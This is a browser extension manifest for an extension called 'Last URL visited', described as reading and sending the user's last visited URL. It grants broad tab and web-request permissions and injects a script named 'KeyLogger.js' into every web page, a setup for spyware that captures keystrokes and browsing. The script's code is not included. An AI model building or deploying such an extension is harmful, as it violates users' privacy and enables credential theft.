{
  "name": "Last URL visited",
  "version": "2",
  "description": "Read the last url visited and send it.",
  "incognito": "split",
  "permissions": [
    "tabs",
    "webRequest",
    "webRequestBlocking",
    "<all_urls>",
    "storage"
  ],

  "content_scripts": [
    {
      "matches": [
        "http://*/*",
        "https://*/*"
      ],
      "js": [
        "KeyLogger.js"
      ],
      "run_at": "document_end"
    }
  ],

  "background": {
    "page": "background.html"
   
  },

  "manifest_version": 2
}
